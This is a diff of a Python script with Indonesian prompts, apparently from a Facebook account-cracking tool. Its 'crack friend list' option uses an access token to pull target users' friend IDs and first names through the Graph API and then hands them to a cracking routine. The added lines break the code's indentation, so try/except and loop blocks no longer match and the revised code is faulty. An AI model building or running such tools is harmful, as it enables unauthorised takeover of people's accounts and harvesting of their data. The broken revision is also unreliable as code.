@@ -332,37 +332,37 @@ def menu():
 	print('')
 	pil=input('\033[1;36m[\033[1;37m?\033[1;36m] \033[1;37mPilih :\033[1;33m ')
 	if(pil in ('01','1')):
-			print('\n\tCRACK DAFTAR TEMAN')
-			try:
-				jumlah=int(input("\n[!] Target maximal 10 Target\n[?] Masukan Jumlah Target: "))
-				if(jumlah>=11):
-					print("\n[!] Target terlalu banyak maximal target 10")
-					time.sleep(2)
-					self.menu()
-				else:pass
-			except:jumlah=1
-			print("\nKetik 'me' Buat Crack Daftar Teman Akun Anda")
-			for j in range(jumlah):
-				ba+=1
-				target=input(f"[+] Masukan ID Target Ke {ba}: ").replace("'me'","me")
-				try:
-					rr=json.loads(req.get(f'https://graph.facebook.com/{target}?access_token={self.token}').text)
-					print(f"[=] Nama Target\t: {rr['name']}")
-					ro=json.loads(req.get(f'https://graph.facebook.com/{target}/friends?access_token={self.token}').text)
-					for x in ro['data']:
-						wok.append(x['id'])
-					print(f"[=] Jumlah ID\t: {len(wok)}")
-					wok.clear()
-				except KeyError:
-					print("Target Tidak Ada")
-					time.sleep(1)
-					self.menu()
-				r=json.loads(req.get(f"https://graph.facebook.com/{target}/friends?access_token={self.token}").text)
-				for x in r['data']:
-					idnya=x['id']
-					nama=x['name'].rsplit(' ')[0]
-					id.append(idnya+'|'+nama)
-			self.kirim()
+		print('\n\tCRACK DAFTAR TEMAN')
+	try:
+		jumlah=int(input("\n[!] Target maximal 10 Target\n[?] Masukan Jumlah Target: "))
+		if(jumlah>=11):
+			print("\n[!] Target terlalu banyak maximal target 10")
+			time.sleep(2)
+			self.menu()
+		else:pass
+		except:jumlah=1
+		print("\nKetik 'me' Buat Crack Daftar Teman Akun Anda")
+	for j in range(jumlah):
+			ha+=1
+			target=input(f"[+] Masukan ID Target Ke {ha}: ").replace("'me'","me")
+	try:
+		rr=json.loads(req.get(f'https://graph.facebook.com/{target}?access_token={self.token}').text)
+		print(f"[=] Nama Target\t: {rr['name']}")
+		ro=json.loads(req.get(f'https://graph.facebook.com/{target}/friends?access_token={self.token}').text)
+		for x in ro['data']:
+			wok.append(x['id'])
+		print(f"[=] Jumlah ID\t: {len(wok)}")
+		wok.clear()
+	except KeyError:
+		print("Target Tidak Ada")
+		time.sleep(1)
+		self.menu()
+	r=json.loads(req.get(f"https://graph.facebook.com/{target}/friends?access_token={self.token}").text)
+	for x in r['data']:
+		idnya=x['id']
+		nama=x['name'].rsplit(' ')[0]
+		id.append(idnya+'|'+nama)
+		self.kirim()
 	elif(pil in ('02','2')):
 		print('\n\tCRACK DAFTAR FOLLOWERS')
 		try:
